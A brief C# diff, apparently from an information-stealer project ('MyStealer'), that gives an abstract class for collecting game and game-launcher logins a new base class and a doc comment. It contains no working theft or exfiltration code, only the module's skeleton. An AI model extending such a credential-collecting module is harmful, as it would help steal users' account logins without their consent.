@@ -2,7 +2,10 @@
 
 namespace MyStealer.Collector.Game
 {
-    public abstract class GameCollector : ModuleBase
+    /// <summary>
+    /// A module that collects game or game launcher logins.
+    /// </summary>
+    public abstract class GameCollector : CollectorBase
     {
         public abstract IImmutableSet<GameLogin> GetLogins();
     }
